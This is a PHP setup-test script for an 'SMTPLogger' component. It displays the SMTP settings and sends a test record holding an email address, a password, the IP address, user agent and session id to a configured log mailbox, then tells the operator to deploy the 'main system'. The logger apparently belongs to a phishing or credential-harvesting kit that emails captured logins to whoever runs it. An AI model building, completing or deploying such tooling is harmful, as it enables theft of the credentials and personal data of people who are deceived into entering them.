<?php
/**
 * SMTP Configuration Test Script
 * 
 * Use this script to test your SMTP settings before deploying the main system.
 * Run this script in your browser: http://yourdomain.com/test_smtp.php
 */

require_once 'config.php';
require_once 'smtp_logger.php';

echo "<!DOCTYPE html>\n";
echo "<html><head><title>SMTP Test</title></head><body>\n";
echo "<h1>SMTP Configuration Test</h1>\n";

// Test configuration
echo "<h2>Configuration Check</h2>\n";
echo "<table border='1' cellpadding='5'>\n";
echo "<tr><th>Setting</th><th>Value</th></tr>\n";
echo "<tr><td>SMTP Host</td><td>" . SMTP_HOST . "</td></tr>\n";
echo "<tr><td>SMTP Port</td><td>" . SMTP_PORT . "</td></tr>\n";
echo "<tr><td>SMTP Username</td><td>" . SMTP_USERNAME . "</td></tr>\n";
echo "<tr><td>Log Email</td><td>" . LOG_EMAIL . "</td></tr>\n";
echo "<tr><td>From Email</td><td>" . FROM_EMAIL . "</td></tr>\n";
echo "</table>\n";

// Check if PHPMailer is available
echo "<h2>PHPMailer Status</h2>\n";
if (file_exists('vendor/autoload.php')) {
    require_once 'vendor/autoload.php';
    if (class_exists('PHPMailer\PHPMailer\PHPMailer')) {
        echo "<p style='color: green;'>✓ PHPMailer is installed and available</p>\n";
    } else {
        echo "<p style='color: red;'>✗ PHPMailer class not found</p>\n";
    }
} else {
    echo "<p style='color: orange;'>⚠ PHPMailer not installed (will use built-in mail() function)</p>\n";
}

// Test email sending
echo "<h2>Email Test</h2>\n";

try {
    $logger = new SMTPLogger();
    
    // Create test data
    $testData = [
        'timestamp' => date('Y-m-d H:i:s'),
        'email' => 'test@example.com',
        'password' => 'test123',
        'ip_address' => $_SERVER['REMOTE_ADDR'] ?? '127.0.0.1',
        'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'Test Browser',
        'browser' => 'Test Browser',
        'referer' => 'SMTP Test Script',
        'session_id' => 'test_session_' . time(),
        'server_name' => $_SERVER['SERVER_NAME'] ?? 'localhost',
        'request_uri' => $_SERVER['REQUEST_URI'] ?? '/test_smtp.php'
    ];
    
    echo "<p>Attempting to send test email...</p>\n";
    
    // Try to send test email
    $result = $logger->logAttempt($testData);
    
    if ($result) {
        echo "<p style='color: green; font-weight: bold;'>✓ Test email sent successfully!</p>\n";
        echo "<p>Check your email at: " . LOG_EMAIL . "</p>\n";
    } else {
        echo "<p style='color: red; font-weight: bold;'>✗ Failed to send test email</p>\n";
        echo "<p>Please check your SMTP configuration and try again.</p>\n";
    }
    
} catch (Exception $e) {
    echo "<p style='color: red; font-weight: bold;'>✗ Error occurred: " . htmlspecialchars($e->getMessage()) . "</p>\n";
}

// Additional checks
echo "<h2>System Checks</h2>\n";
echo "<ul>\n";

// Check if logs directory exists
if (is_dir('logs')) {
    echo "<li style='color: green;'>✓ Logs directory exists</li>\n";
    if (is_writable('logs')) {
        echo "<li style='color: green;'>✓ Logs directory is writable</li>\n";
    } else {
        echo "<li style='color: red;'>✗ Logs directory is not writable</li>\n";
    }
} else {
    echo "<li style='color: red;'>✗ Logs directory does not exist</li>\n";
}

// Check PHP version
$phpVersion = phpversion();
echo "<li>PHP Version: " . $phpVersion;
if (version_compare($phpVersion, '7.4', '>=')) {
    echo " <span style='color: green;'>✓</span></li>\n";
} else {
    echo " <span style='color: red;'>✗ (Requires PHP 7.4+)</span></li>\n";
}

// Check required functions
$requiredFunctions = ['mail', 'curl_init', 'json_encode'];
foreach ($requiredFunctions as $func) {
    if (function_exists($func)) {
        echo "<li style='color: green;'>✓ Function $func() available</li>\n";
    } else {
        echo "<li style='color: red;'>✗ Function $func() not available</li>\n";
    }
}

echo "</ul>\n";

echo "<h2>Next Steps</h2>\n";
echo "<ol>\n";
echo "<li>If the test email was sent successfully, your SMTP configuration is working</li>\n";
echo "<li>Update the configuration in config.php with your actual SMTP settings</li>\n";
echo "<li>Delete or rename this test file for security</li>\n";
echo "<li>Deploy your main system</li>\n";
echo "</ol>\n";

echo "<p><strong>Important:</strong> Remember to delete this test file after testing!</p>\n";
echo "</body></html>\n";
?>